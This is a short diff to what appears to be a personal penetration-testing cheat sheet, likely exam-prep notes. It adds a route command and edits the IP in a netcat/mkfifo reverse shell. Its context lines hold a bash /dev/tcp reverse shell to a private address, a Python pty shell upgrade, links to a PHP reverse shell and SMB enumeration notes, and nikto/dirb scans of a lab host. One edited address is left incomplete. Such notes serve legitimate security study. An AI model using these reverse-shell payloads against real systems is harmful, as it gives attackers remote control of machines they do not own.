@@ -7,7 +7,7 @@ Payloads -
 #!/bin/bash
 bash -i >& /dev/tcp/172.16.1.1/443 0>&1
 
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.16.1.1 4434 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.19. 443 >/tmp/f
 
 Windows reverse shell .php - https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php
 
@@ -44,6 +44,8 @@ SMB Map - https://tools.kali.org/information-gathering/smbmap
 Null sessions RPC etc - https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html
 
 upgrade Python shell - python -c 'import pty; pty.spawn("/bin/bash")'
+
+adding routes to kali - ip route add x.x.x.x. via x.x.x.x
 
 nikto -host=http://10.10.10.29
 dirb http://10.10.10.29
